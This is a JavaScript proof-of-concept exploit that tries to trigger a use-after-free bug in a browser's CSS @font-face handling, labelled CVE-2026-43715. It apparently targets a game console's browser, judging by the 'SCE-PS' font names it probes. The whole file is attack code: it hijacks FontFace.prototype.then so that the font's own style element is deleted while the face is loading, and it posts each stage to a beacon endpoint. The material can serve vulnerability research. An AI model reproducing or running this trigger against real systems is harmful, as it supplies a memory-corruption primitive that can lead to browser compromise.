// p445-fontface-uaf.js — CVE-2026-43715 CSSFontFace iterateClients UAF
// Key: must use CSS-connected @font-face (not JS FontFace constructor).
// Getter must remove the @font-face's OWN <style> element to trigger
// buildCompleted → CSSFontFaceSet::remove → removeClient mid-iteration.
(function() {
    var RUN = 'p445-' + Date.now().toString(36);
    function B(stage, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + stage + '/' + RUN, false);
            x.send(body || '');
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);
    if (typeof FontFace === 'undefined') { B('DEAD', 'NO-FONTFACE'); return; }
    if (!document.fonts) { B('DEAD', 'NO-DOCFONTS'); return; }

    var B64 = 'AAEAAAAKAIAAAwAgT1MvMl5FWwIAAACsAAAAYGNtYXAACQB2AAABDAAAAC5nbHlmAAAAAAAAATwAAAAKaGVhZGESQ6EAAAFIAAAANmhoZWEFFgEuAAABgAAAACRobXR4AfQAAAAAAaQAAAAEbG9jYQAAAAUAAAGoAAAABG1heHAAAgAAAAABrAAAACBuYW1lA28TZwAAAcwAAABccG9zdP+4ADIAAAIoAAAAGA==';

    // ====================== TEST A: CSS @font-face with local() names ======================
    // Try local font names for synchronous load
    var localNames = [
        'SCE-PS Rodin Pro DB', 'SCE-PS Rodin Pro B', 'SCE-PS Matisse Pro',
        'Arial', 'Helvetica', 'Times New Roman', 'Courier New',
        'serif', 'sans-serif', 'monospace', 'cursive',
        'SCE-PS Rodin Pro L', 'SCE-PS Rodin Pro M'
    ];

    var foundLocal = null;
    for (var i = 0; i < localNames.length; i++) {
        try {
            var tf = new FontFace('_lp_' + i, "local('" + localNames[i] + "')");
            document.fonts.add(tf);
            tf.load();
            if (tf.status === 'loaded') {
                foundLocal = localNames[i];
                document.fonts.delete(tf);
                break;
            }
            document.fonts.delete(tf);
        } catch(e) {}
    }
    B('P0', 'LOCAL=' + (foundLocal || 'NONE'));

    // ====================== TEST B: CSS @font-face → remove own style ======================
    function testCSS(id, src, styleId) {
        var fontStyle = document.createElement('style');
        fontStyle.id = styleId;
        fontStyle.textContent = "@font-face { font-family: '" + id + "'; src: " + src + "; }";
        document.head.appendChild(fontStyle);

        // Do NOT use the font in any element — keep the face in Pending state
        document.body.offsetHeight;

        // Find the FontFace object
        var face = null;
        try {
            var it = document.fonts.values();
            var e;
            while (!(e = it.next()).done) {
                if (e.value.family.replace(/['"]/g, '') === id) {
                    face = e.value;
                    break;
                }
            }
        } catch(ex) {}

        if (!face) return { found: false };

        // Install thenable getter — remove the FONT style element
        var thenFired = 0;
        var thenErr = '';
        Object.defineProperty(FontFace.prototype, 'then', { get: function() {
            thenFired++;
            if (thenFired > 1) return undefined;
            try {
                // Remove the @font-face style element itself
                // This triggers buildCompleted → CSSFontFaceSet::remove → removeClient
                var el = document.getElementById(styleId);
                if (el) el.remove();
                document.body.offsetHeight;
            } catch(e) { thenErr += e; }
            return undefined;
        }, configurable: true });

        // Access loaded promise, then trigger load
        var loadErr = '';
        try {
            face.loaded;
            face.load();
        } catch(e) { loadErr += e; }

        try { delete FontFace.prototype.then; } catch(e) {}

        return {
            found: true,
            status: face.status,
            thenFired: thenFired,
            loadErr: loadErr,
            thenErr: thenErr
        };
    }

    // Test B1: CSS @font-face with local font (if found)
    if (foundLocal) {
        var b1 = testCSS('p445a', "local('" + foundLocal + "')", 'sf445a');
        B('B1-LOCAL', JSON.stringify(b1));
    } else {
        B('B1-SKIP', 'NO-LOCAL');
    }

    // Test B2: CSS @font-face with data: URI font (async, but still CSS-connected)
    var b2 = testCSS('p445b', 'url(data:font/ttf;base64,' + B64 + ')', 'sf445b');
    B('B2-DATA', JSON.stringify(b2));

    // For async data: URI, the font may not have loaded yet.
    // Wait and check if the thenable fires during async load completion.
    if (b2.found && b2.thenFired === 0) {
        // Font still loading — set up thenable for when it completes
        var face2 = null;
        try {
            var it2 = document.fonts.values();
            var e2;
            while (!(e2 = it2.next()).done) {
                if (e2.value.family.replace(/['"]/g, '') === 'p445b') {
                    face2 = e2.value;
                    break;
                }
            }
        } catch(ex) {}

        if (face2) {
            // Re-create the style element (it was removed by the first attempt)
            var fontStyle2 = document.createElement('style');
            fontStyle2.id = 'sf445b2';
            fontStyle2.textContent = "@font-face { font-family: 'p445c'; src: url(data:font/ttf;base64," + B64 + "); }";
            document.head.appendChild(fontStyle2);
            document.body.offsetHeight;

            setTimeout(function() {
                var face3 = null;
                try {
                    var it3 = document.fonts.values();
                    var e3;
                    while (!(e3 = it3.next()).done) {
                        if (e3.value.family.replace(/['"]/g, '') === 'p445c') {
                            face3 = e3.value;
                            break;
                        }
                    }
                } catch(ex) {}

                if (!face3) {
                    B('B3-ASYNC', 'NO-FACE3');
                    reportDone();
                    return;
                }

                B('B3-PRE', 'status=' + face3.status);

                if (face3.status === 'loaded') {
                    // Already loaded — too late for sync trigger
                    B('B3-ASYNC', 'ALREADY-LOADED');
                    reportDone();
                    return;
                }

                // Face still loading, set up thenable getter
                var then3 = 0;
                Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                    then3++;
                    if (then3 > 1) return undefined;
                    try {
                        var el = document.getElementById('sf445b2');
                        if (el) el.remove();
                        document.body.offsetHeight;
                    } catch(e) {}
                    return undefined;
                }, configurable: true });

                face3.load();

                // Check after a delay
                setTimeout(function() {
                    try { delete FontFace.prototype.then; } catch(e) {}
                    B('B3-ASYNC', 'then3=' + then3 + ',status=' + face3.status);
                    reportDone();
                }, 2000);
            }, 500);

            return; // Async path continues via setTimeout
        }
    }

    reportDone();

    // ====================== TEST C: ArrayBuffer FontFace (sync load baseline) ======================
    function reportDone() {
        // Test C: ArrayBuffer-based FontFace for baseline (sync load, but no CSS connection)
        var raw = atob(B64);
        var abuf = new ArrayBuffer(raw.length);
        var u8 = new Uint8Array(abuf);
        for (var j = 0; j < raw.length; j++) u8[j] = raw.charCodeAt(j);

        var victim = document.createElement('style');
        victim.id = 'v445c';
        victim.textContent = '.v445c { color: blue; }';
        document.head.appendChild(victim);

        var faceC;
        try {
            faceC = new FontFace('p445d', abuf);
            document.fonts.add(faceC);
        } catch(e) {
            B('C-DEAD', 'ctor:' + e);
            B('DONE', RUN);
            return;
        }

        var thenC = 0;
        Object.defineProperty(FontFace.prototype, 'then', { get: function() {
            thenC++;
            if (thenC > 1) return undefined;
            try {
                var el = document.getElementById('v445c');
                if (el) el.remove();
                document.body.offsetHeight;
            } catch(e) {}
            return undefined;
        }, configurable: true });

        try {
            faceC.loaded;
            faceC.load();
        } catch(e) {}

        try { delete FontFace.prototype.then; } catch(e) {}
        B('C-AB', 'thenC=' + thenC + ',status=' + faceC.status);
        B('DONE', RUN);
    }
})();
